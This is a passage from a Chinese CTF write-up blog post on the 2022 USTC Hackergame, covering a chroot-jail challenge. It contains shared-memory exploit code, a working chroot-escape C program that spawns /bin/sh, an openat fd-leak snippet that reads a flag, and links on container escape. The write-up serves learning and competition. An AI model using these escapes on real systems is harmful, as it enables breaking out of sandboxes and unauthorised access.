    <span class="token keyword">int</span> written<span class="token punctuation">;</span> <span class="token comment">// 作为一个标志，非0：表示可读，0：表示可写</span>
    <span class="token keyword">char</span> text<span class="token punctuation">[</span>TEXT_SZ<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录写入 和 读取 的文本</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
 
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
 
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>shm <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">shared_use_st</span> <span class="token operator">*</span>shared<span class="token punctuation">;</span> <span class="token comment">// 指向shm</span>
    <span class="token keyword">int</span> shmid<span class="token punctuation">;</span> <span class="token comment">// 共享内存标识符</span>
 
    <span class="token comment">// 创建共享内存</span>
    shmid <span class="token operator">=</span> <span class="token function">shmget</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">key_t</span><span class="token punctuation">)</span><span class="token number">1234</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">shared_use_st</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0666</span><span class="token operator">|</span>IPC_CREAT<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>shmid <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"shmat failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 
    <span class="token comment">// 将共享内存连接到当前进程的地址空间</span>
    shm <span class="token operator">=</span> <span class="token function">shmat</span><span class="token punctuation">(</span>shmid<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>shm <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"shmat failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 
    <span class="token comment">// printf("\nMemory attached at %X\n", (int)shm);</span>
 
    <span class="token comment">// 设置共享内存</span>
    shared <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">shared_use_st</span><span class="token operator">*</span><span class="token punctuation">)</span>shm<span class="token punctuation">;</span> <span class="token comment">// 注意：shm有点类似通过 malloc() 获取到的内存，所以这里需要做个 类型强制转换</span>
    shared<span class="token operator">-&gt;</span>written <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment">// while (1) // 读取共享内存中的数据</span>
    <span class="token punctuation">{</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 没有进程向内存写数据，有数据可读取</span>
        <span class="token comment">// if (shared-&gt;written == 1)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> shared<span class="token operator">-&gt;</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
            <span class="token comment">// 读取完数据，设置written使共享内存段可写</span>
            shared<span class="token operator">-&gt;</span>written <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
 
            <span class="token comment">// 输入了 end，退出循环（程序）</span>
            <span class="token comment">// if (strncmp(shared-&gt;text, "end", 3) == 0)</span>
            <span class="token comment">// {</span>
            <span class="token comment">//     break;</span>
            <span class="token comment">// }</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// else // 有其他进程在写数据，不能读取数据</span>
        <span class="token comment">// {</span>
        <span class="token comment">//     sleep(1);</span>
        <span class="token comment">// }</span>
    <span class="token punctuation">}</span>
 
    <span class="token comment">// 把共享内存从当前进程中分离</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">shmdt</span><span class="token punctuation">(</span>shm<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"shmdt failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 
    <span class="token comment">// 删除共享内存</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">shmctl</span><span class="token punctuation">(</span>shmid<span class="token punctuation">,</span> IPC_RMID<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"shmctl(IPC_RMID) failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 
    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>忽略一些没啥用的代码，懒得删了（</p>
<p>然后 编译一下，传上去执行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc -o expAA expAA.c
gcc -o expBB expBB.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221028233841206.png"></p>
<p><code>flag{ChR00t_ISNOTFULL_1501AtiOn_4f5ca7cef7}</code></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/earthquake/chw00t/">chw00t</a></p>
<p><a target="_blank" rel="noopener" href="https://filippo.io/escaping-a-chroot-jail-slash-1/">Escaping a chroot jail/1</a></p>
<blockquote>
<p>A catch-all compile-everywhere C <code>unchroot</code></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token keyword">int</span> dir_fd<span class="token punctuation">,</span> x<span class="token punctuation">;</span>
 <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string">".42"</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 dir_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">chroot</span><span class="token punctuation">(</span><span class="token string">".42"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">fchdir</span><span class="token punctuation">(</span>dir_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">close</span><span class="token punctuation">(</span>dir_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token keyword">for</span><span class="token punctuation">(</span>x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> x <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> x<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">chroot</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
 <span class="token keyword">return</span> <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://kitctf.de/writeups/32c3ctf/docker">32C3 CTF: Docker writeup</a> (exp: <a target="_blank" rel="noopener" href="https://github.com/kitctf/writeups/blob/master/32c3-ctf/docker/client.c">https://github.com/kitctf/writeups/blob/master/32c3-ctf/docker/client.c</a>)</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1552332">容器逃逸成真：从CTF解题到CVE-2019-5736漏洞挖掘分析</a></p>
<p><a target="_blank" rel="noopener" href="https://jasonkayzk.github.io/2021/06/26/Linux%E4%B8%AD%E7%9A%84chroot%E5%91%BD%E4%BB%A4/">Linux中的chroot命令</a></p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903592466317319">chroot 命令小记</a></p>
<p><a target="_blank" rel="noopener" href="https://web.archive.org/web/20160127150916/http://www.bpfh.net/simes/computing/chroot-break.html">How to break out of a <code>chroot()</code> jail</a></p>
<p><a target="_blank" rel="noopener" href="https://tbhaxor.com/breaking-out-of-chroot-jail-shell-environment/">Breaking out of CHROOT Jailed Shell Environment</a></p>
<p><a target="_blank" rel="noopener" href="https://atum.li/2017/04/25/linuxsandbox/#ptrace">linux中的容器与沙箱初探</a></p>
<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/10/15/sandbox/">清华校赛THUCTF2019 之 固若金汤</a> （用的 <code>openat</code>，有未关闭的 fd</p>
<blockquote>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">openat</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"../../../../../flag"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">read</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] from server\\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
</blockquote>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇里的题目更多的是 <strong>binary 方向</strong> 的，感觉做题过程中也学到了许多</p>
<p>下一篇主要包括以下题目：</p>
<p>传达不到的文件，二次元神经网络，你先别急，惜字如金，量子藏宝图</p>
<p>详见： <strong><a href="https://miaotony.xyz/2022/10/31/CTF_2022Hackergame_0x03/">CTF | 2022 USTC Hackergame WriteUp 0x03</a></strong></p>
<p><em>（溜了溜了喵</em></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz/2022/10/30/CTF_2022Hackergame_0x02/">https://miaotony.xyz/2022/10/30/CTF_2022Hackergame_0x02/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特别声明外，均采用
                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                                <a href="/tags/WriteUp/">
                                    <span class="chip bg-color">WriteUp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">打赏一下让我来点好吃好玩的呗~</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <!-- 
                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li> 
                        -->
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <!-- 
                        <div id="alipay">
                        <img src="/" class="reward-img" alt="支付宝打赏二维码">
                        </div> 
                -->
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.min.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '116343b4650fce4789b6',
        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
        repo: 'miaotony.github.io',
        owner: 'miaotony',
        admin: "miaotony",
        id: '2022-10-30T23-20-00',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2022/10/31/CTF_2022Hackergame_0x03/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="CTF | 2022 USTC Hackergame WriteUp 0x03">
                        
                        <span class="card-title">CTF | 2022 USTC Hackergame WriteUp 0x03</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            这是2022 Hackergame的wp第三部分，主要包括一些难度稍大的题目，以及喵喵的碎碎念，总之学到了许多。
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-31
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/WriteUp/">
                        <span class="chip bg-color">WriteUp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/10/30/CTF_2022Hackergame_0x01/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="CTF | 2022 USTC Hackergame WriteUp 0x01">
                        
                        <span class="card-title">CTF | 2022 USTC Hackergame WriteUp 0x01</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            又是一年Hackergame，今年内卷严重，题目难度有所提升，同时也学到了许多。
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-30
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/WriteUp/">
                        <span class="chip bg-color">WriteUp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('200')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: MiaoTony&#39;s小窝<br />'
            + '文章作者: MiaoTony<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者 MiaoTony 所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h2, h3, h4, h5'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
        <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">MiaoTony</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">429.5k</span>&nbsp;字
                                                                                    <span id="busuanzi_container_site_pv">
			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
                                    <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
                        <br>
                        <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2019";
                    var startMonth = "11";
                    var startDate = "28";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
                        <br>
